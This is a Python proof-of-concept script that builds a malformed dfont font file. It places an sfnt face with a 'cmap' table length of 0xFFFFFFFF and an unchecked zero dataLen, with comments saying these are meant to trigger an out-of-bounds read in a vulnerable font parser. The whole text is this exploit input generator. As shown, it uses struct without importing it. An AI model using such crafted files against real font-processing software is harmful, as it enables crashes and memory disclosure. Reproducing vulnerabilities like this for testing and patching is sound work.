# Build a dfont file
# Header (16 bytes)
# tag = 00 00 01 00 (DFontTag), which is also data offset = 65536
# map offset (4 bytes)
# dataLen (4 bytes)
# mapLen (4 bytes)

# We'll build the map and place it at offset 16
# Map header is 28 bytes
# typeList at map+28
# ResourceTypeRecord at typeList+2
# ResourceRecord at typeRecord+8

map_offset = 16
typeList_rel = 28  # relative to map
typeList_abs = map_offset + typeList_rel  # 44
typeRecord_abs = typeList_abs + 2  # 46
resourcesZ_rel = 8  # relative to type record -> resources at 54
resourceRecord_abs = typeRecord_abs + 8  # 54

# ResourceRecord offset (3 bytes) = offset from data_base (65536) to face
face_offset = 0  # face at 65536

# Build the face (SFNT) with 1 table
# sfnt_version = 00 01 00 00
# numTables = 1
# searchRange, entrySelector, rangeShift
# TableRecord: tag, checkSum, offset, length

# We'll place the face at 65536. Table directory at 65536.
# Table data offset (relative to face) - let's point it to end of file
# File size = 65536 + face_size + table_data
# Let's make table data at face + 28 (right after directory), length huge

numTables = 1
searchRange = 16
entrySelector = 0
rangeShift = 0

# Table record
table_tag = b'cmap'
table_checksum = b'\x00\x00\x00\x00'
table_offset = 28  # relative to face base
table_length = 0xFFFFFFFF  # huge length -> OOB read

face = struct.pack('>I', 0x00010000)  # sfnt_version
face += struct.pack('>HHHH', numTables, searchRange, entrySelector, rangeShift)
face += table_tag + table_checksum + struct.pack('>II', table_offset, table_length)

# Build the file
# Start with header
dataLen = 0  # dataLen - in vulnerable version not checked
mapLen = 28 + 2 + 8 + 12  # map header + lenM1 + typeRecord + resourceRecord

# Actually mapLen should cover the map. Let me compute.
# map at 16, map header 28 bytes (16-43), typeList lenM1 at 44-45, typeRecord 46-53, resourceRecord 54-65
# So map spans 16 to 66. mapLen = 50
mapLen = 50

# Build map
map_data = bytearray()
map_data += b'\x00' * 16  # reserved0
map_data += struct.pack('>I', 0)  # reserved1
map_data += struct.pack('>H', 0)  # resreved2
map_data += struct.pack('>H', 0)  # attrs
map_data += struct.pack('>H', typeList_rel)  # typeList offset (relative to map)
map_data += struct.pack('>H', 0)  # nameList

# typeList: ArrayOfM1<ResourceTypeRecord>
# lenM1 = 0 (1 type record)
map_data += struct.pack('>H', 0)  # lenM1

# ResourceTypeRecord
map_data += b'sfnt'  # tag
map_data += struct.pack('>H', 0)  # resCountM1 (1 resource)
map_data += struct.pack('>H', resourcesZ_rel)  # resourcesZ offset (relative to type record)

# ResourceRecord
map_data += struct.pack('>H', 0)  # id
map_data += struct.pack('>H', 0)  # nameOffset
map_data += b'\x00'  # attrs
map_data += face_offset.to_bytes(3, 'big')  # offset (3 bytes) from data_base
map_data += b'\x00\x00\x00\x00'  # reserved

# Now assemble the file
# Header
header = b'\x00\x00\x01\x00'  # tag = DFontTag
header += struct.pack('>I', map_offset)  # map offset
header += struct.pack('>I', dataLen)  # dataLen
header += struct.pack('>I', mapLen)  # mapLen

# File: header + padding to map_offset + map + padding to 65536 + face
file_data = bytearray()
file_data += header
# pad to map_offset (16)
file_data += b'\x00' * (map_offset - len(file_data))
file_data += map_data
# pad to 65536
file_data += b'\x00' * (65536 - len(file_data))
file_data += face

with open('/tmp/test.dfont', 'wb') as f:
    f.write(file_data)

print("File size:", len(file_data))
print("Face at 65536, table data at 65536+28 =", 65536+28)
print("File end:", len(file_data))
